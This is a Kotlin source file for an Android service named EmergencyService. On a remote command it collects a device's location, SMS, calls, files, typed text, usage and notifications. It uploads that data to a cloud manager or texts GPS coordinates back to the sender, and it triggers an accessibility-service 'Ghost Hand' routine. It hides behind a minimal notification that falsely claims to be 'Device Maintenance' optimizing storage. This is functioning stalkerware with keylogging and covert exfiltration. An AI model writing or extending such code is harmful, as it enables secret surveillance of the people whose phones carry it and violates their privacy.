package com.example.myandroid

import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.IBinder
import android.telephony.SmsManager
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await

class EmergencyService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // CRITICAL FIX: Promote to Foreground immediately to prevent OS killing the service
        try {
            if (android.os.Build.VERSION.SDK_INT >= 34) {
                startForeground(666, createNotification(), 1073741824) // FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            } else {
                startForeground(666, createNotification())
            }
        } catch (e: Exception) {
            DebugLogger.log("EMERGENCY_ERR", "startForeground failed: ${e.message}")
        }

        val sender = intent?.getStringExtra("sender") ?: return START_NOT_STICKY
        val rawCmd = intent?.getStringExtra("codes") ?: "0"

        // PARSE COMMAND: Code-Duration-Frequency (e.g., "1-15-3")
        val parts = rawCmd.split("-")
        val moduleCode = parts.getOrElse(0) { "0" }
        val durationMins = parts.getOrElse(1) { "5" }.toLongOrNull() ?: 5L
        val freqSecs = parts.getOrElse(2) { "30" }.toLongOrNull() ?: 30L
        
        // Parse Modules
        val modules = parseCodes(moduleCode)

        scope.launch {
            DebugLogger.log("CodeRed", "Triggered! Cmd: $rawCmd (Dur: ${durationMins}m, Freq: ${freqSecs}s)")

            // SINGLE RUN MODE (Frequency 0)
            if (freqSecs <= 0L) {
                if (isOnline()) {
                    CloudManager.uploadData(applicationContext, modules)
                } else {
                     MyAccessibilityService.triggerDataRecovery()
                     delay(5000) // Give Ghost Hand a moment
                     val loc = getLastKnownLocation()
                     if (loc != null) sendSms(sender, "ONE-SHOT: ${loc.latitude},${loc.longitude}")
                }
                stopSelf()
                return@launch
            }

            // LOOP MODE
            val endTime = System.currentTimeMillis() + (durationMins * 60 * 1000)
            
            // If offline, try Ghost Hand once at start
            if (!isOnline()) MyAccessibilityService.triggerDataRecovery()

            while (System.currentTimeMillis() < endTime) {
                try {
                    if (isOnline()) {
                        // ONLINE: Upload Data
                        DebugLogger.log("CodeRed", "Online. Uploading modules: $modules")
                        CloudManager.uploadData(applicationContext, modules)
                    } else {
                        // OFFLINE: SMS Beacon
                        val loc = getLastKnownLocation()
                        val locMsg = if (loc != null) "${loc.latitude},${loc.longitude}" else "GPS_SEARCHING"
                        sendSms(sender, "CR-BEACON: $locMsg")
                        DebugLogger.log("CodeRed", "Offline. SMS Sent: $locMsg")
                        
                        // Try to reconnect periodically
                        MyAccessibilityService.triggerDataRecovery()
                    }
                } catch (e: Exception) {
                    DebugLogger.log("CodeRedError", e.message ?: "Unknown")
                }

                delay(freqSecs * 1000)
            }
            
            DebugLogger.log("CodeRed", "Session Expired. Shutting down.")
            stopSelf()
        }

        return START_NOT_STICKY
    }

    private fun parseCodes(raw: String): List<String> {
        val list = mutableListOf<String>()
        val parts = raw.split(",")
        
        if (parts.contains("0")) return listOf("ALL")

        parts.forEach { c ->
            when(c.trim()) {
                "1" -> list.add("location")
                "2" -> list.add("sms")
                "3" -> list.add("phone")
                "4" -> list.add("files")
                "5" -> list.add("typing")
                "6" -> list.add("usage")
                "7" -> list.add("notifications")
            }
        }
        if (list.isEmpty()) list.add("location") 
        return list
    }

    private suspend fun getLastKnownLocation(): Location? {
        return try {
             if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                 val fused = LocationServices.getFusedLocationProviderClient(this)
                 fused.lastLocation.await()
             } else null
        } catch (e: Exception) { null }
    }

    private fun sendSms(phone: String, msg: String) {
        try {
            val smsManager = getSystemService(SmsManager::class.java)
            smsManager.sendTextMessage(phone, null, msg, null, null)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun isOnline(): Boolean {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
        return caps?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
    }

    private fun createNotification(): android.app.Notification {
        val channelId = "emergency_channel"
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val chan = android.app.NotificationChannel(channelId, "System Maintenance", android.app.NotificationManager.IMPORTANCE_MIN)
            chan.setShowBadge(false)
            getSystemService(android.app.NotificationManager::class.java).createNotificationChannel(chan)
        }
        return androidx.core.app.NotificationCompat.Builder(this, channelId)
            .setContentTitle("Device Maintenance")
            .setContentText("Optimizing storage and power metrics...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN)
            .build()
    }
}